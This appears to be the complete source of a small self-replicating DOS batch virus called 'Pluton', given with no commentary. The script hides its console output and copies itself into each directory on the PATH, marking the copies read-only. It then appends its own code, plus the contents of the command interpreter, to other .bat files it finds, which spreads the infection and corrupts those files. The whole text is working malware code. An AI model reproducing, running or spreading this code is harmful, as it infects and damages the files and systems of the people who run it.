@ctty nul
copy %0 pluton.bat
if not "%1"=="" goto copy
call %0 %path%
:copy
shift
copy pluton.bat %0
if not "%0"=="" goto copy
attrib %0 +r
for %%a in (*.bat) do set Pluton=%%a
for %%b in (%Pluton%) do find "Pluton" %%b
if not errorlevel 1 exit
type %0 >> %Pluton%
copy %comspec% CM.bat
type CM.bat >> %Pluton%
del CM.bat
